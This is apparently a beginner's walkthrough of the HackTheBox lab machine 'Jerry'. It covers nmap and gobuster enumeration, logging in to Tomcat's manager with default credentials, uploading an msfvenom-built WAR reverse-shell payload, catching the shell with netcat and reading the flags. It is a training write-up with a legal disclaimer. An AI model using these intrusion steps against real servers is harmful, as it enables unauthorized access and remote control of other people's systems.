# About me

Welcome all to my ``Offensive Security`` journey and first ever write up.
I have been active on ```HackTheBox``` and `Tryhackme` since December 2020.
However I have only been able to work on few  machines during the last two years while learning about ```Info-Sec``` fundamentals on ```TryHackMe``` and others few online platforms, also while I completed my degree.

Before we dive in the write up  for the first machine I Pwned that is```Jerry``` ,it's important to note that prior rooting the first machine on ```Hackthebox``` I had quasi zero experience in ``Hacking`` neither in infornation security. Since then, I have been on mission to learn more about information Security. I then dedicated myself to pursue knowledge in this interesting field.

If you are new to ```Cyber Security```, there are many platforms out there that can help you get the knowledge.
As of now I am still a learner and I believe in this industry ```Learning don't Stop```. I am currently going for my first certification that is the ```eJPT``` from ```Elearnsecurity```. in the next step I would be taking you through how I hacked my first machine on Hackthebox.

# Jerry


![ping](https://user-images.githubusercontent.com/61636217/175174375-06a23643-f5d6-4390-a405-267d623c635b.png)




From the ping command we can identify that our target machine runs on ```Windows OS``` by looking at the ```TTL(Time to live)``` response. This a trick that I learned from some of the big names I watched sovling boxes on Youtube like ```ippsec```, ```hackersploit``` and the ```Ofefensive Security (S1REN)``` my Favorite to Hackers to watch.
Here We have pinged the machine and it echoed back to us.
Now we will proceed on scanning for open ports and enumerate all services running on our target machine.

To discover what services are currently running on the target machine, I used ```Nmap``` however there other tools that can give you the same output as ```nmap```.


# Enumeration with Nmap


```Nmap -sC -sV -T4  -Pn <IP Address> -oN <outputfile>```

```sC``` is for default scripts scan.
```sV``` is for version of the services runnimg.
```T4``` is the speed of the scan. not that, this method is crucial because you don't want to make to much noise in the network traffic so declaring a speed of four the best you need for a fast scan.
```oN``` is redirect that fouding into a file. This you would nao

![scan](https://user-images.githubusercontent.com/61636217/173915915-977a8bd6-0ef2-4280-8b91-0ac00db0a277.png)

# Enumeration with Gobuster

After we have ran the ```Nmap``` command we have discovered that there is 2 open ports on our target machine.

```22``` & ``8080``. We noticed that a Tomcat is running on that machine.
Before going deep in the attack we must first try enumerate some port on port 8080 to find out what directory are hosted in the application adn for that I ran ```Gobuster``` for directory discovery.

``` gobuster dir --url  http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100```
we discover an interesting directory ```Manager```.
From this step there are differents way you can plan your attack. Here We are going to exploit a misconfigure Tomcat Server.
by default All Tomcat creds are ```tomcat``` & ```s3cret```. but there are other ways to get creds.Navitgating to that Manager directory on port 8080 we prompted with sign in option. to get creds the easy way is the hit the ```cancel``` button and you will redirected to a ```401 Unauthorized``` that display the credentials in plain text. Or you can use ``Metasploit`` to run an exploit against Tomcat server to get the credentials.

# Attack

![8080](https://user-images.githubusercontent.com/61636217/175167658-cc992ea4-6978-43ab-ad94-e186c93ab26d.png)

![signin](https://user-images.githubusercontent.com/61636217/175167703-d26fcaa2-e862-45e8-ae76-ed85f98c9fda.png)


![creds](https://user-images.githubusercontent.com/61636217/175167731-af77b831-5f62-4c9a-b87a-d3bd4ad4ba48.png)

![manager](https://user-images.githubusercontent.com/61636217/175167776-b4adf04a-afc3-4998-b984-2b408783d7aa.png)

Looking at that last picture after we have successfully logged in the application we see that we have an option to upload a war file.
This is our point of entry to the system. Back on my console I created a war file payloads with ```msfvenom``` to get a reverse shell.
the command I ran ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f <File_extension> -o <file_output.war>```
I then had my payload ready to get uploaded on the target application with a listener that I had ready to receive connection from our targer after we have executed tha file that we uploaded on the server. the command was ``nc -lnvp <Port>``.

# Getting a SHELL

![shell](https://user-images.githubusercontent.com/61636217/175169884-bacaa480-f6a3-480a-96d8-db75e03d506a.png)

Our payloads executed well and gave us a shell. We then proceed to navigate our in the target system to retreive the flags.

# Flags


![flags](https://user-images.githubusercontent.com/61636217/175169915-39c55c4d-b7a1-408e-926f-4c42c5990559.png)

For this machine we did not need to escalated our privileges  to get the root flag because we had the ``` Two for one ``` flags in one file.
This was Pwned machine on ```Hackthebox``` it is a realistic as Apache Tomcat server which is often found configured with weak credentials.


# End
Stay tune for more content to come on my journey. Note that hacking is very complexe and therefore you must have strong understanding of how networks servive work to be able to find the right approach to compromised your target.

# Disclaimer.

Per law Hacking is strickly illigal. You must have written permissions to contact this type of activities. Faillure to do may result you being in hot waters with the Law. There are tons of platforms online that can give you the opportunity to learn these skills and practice them on misconfigure machine that they provide. Get the knowledge and  get authorization to hack. 

